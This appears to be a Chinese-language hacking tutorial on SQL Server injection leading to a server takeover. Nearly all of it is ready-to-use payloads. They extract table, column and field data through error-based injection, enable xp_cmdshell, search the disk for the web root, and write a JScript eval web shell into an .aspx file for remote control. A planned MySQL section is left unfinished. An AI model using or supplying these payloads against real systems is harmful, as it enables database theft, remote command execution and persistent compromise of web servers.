# sql-inject-getshell
## 篇1: 基于sqlserver的getshell
首先说说从sqlserver提取数据的过程</br>
直接下payload
```
id=1'having 1=1 --    #报错出 表名.列名 如 xs.id
id=1'group by id having 1=1 -- #group by 后接第一个列名id 报错出 第二个列 如 xs.xh
id=1'group by id,xh having 1=1 -- #再加第二个列名  报错出第三个列名 反复到最后一个列名
id=1' and 1=convert(int,(select top 1 users.username from users)) #当知道列名和表名时 直接报错出 字段数据
```
但是:当数据为int型时数据转换函数就不好使了</br>
其实使用两条语句即可批量爆出数据</br>
```
id=1'having 1=1-- #这里要获取出相关表名 如 xs
id=1'and 1=(select top 3 * from xs FOR XML PATH(''))-- #top后的数字为返回数据条数，该命令可返回所有字段数据 再使用where xh in(xxx) 进行数据筛选.
```
接下来是sqlserver的getshell命令
```
#判断dbo权限
id=1' and user>1--
#查看是否有xp_cmdshell
id=1' and 1=(select count(*) from master.dbo.sysobjects where xtype ='x' AND name='xp_cmdshell')-- 
#启动xp_cmdshell
id=1';EXEC sp_configure 'show advanced options',1;-- //允许修改高级参数
id=1'RECONFIGURE;
id=1'EXEC sp_configure 'xp_cmdshell',1;  //打开xp_cmdshell扩展
RECONFIGURE;--
#创建临时表
id=1';CREATE TABLE tt_tmp (tmp1 varchar(8000));--
#用xp_cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中
id=1';insert into tt_tmp(tmp1) exec master..xp_cmdshell 'for /r c:\ %i in (Newslist*.aspx) do @echo %i ';--
#将临时表中的路径名报错出来
id=1' and 1=(select top 1 tmp1 from tt_tmp)--  #如 c:\xxx\www\NewsList.aspx
id=1' and 1=(select top 1 tmp1 from tt_tmp where tmp1 not in ('c:\xxx\www\NewsList.aspx'))-- 
#写入一句话shell
id=1';exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\xxx\\www\\233.aspx' ;--
#然后网站管理工具链接.
```
## 篇2 基于mysql的getshell
未完待续...
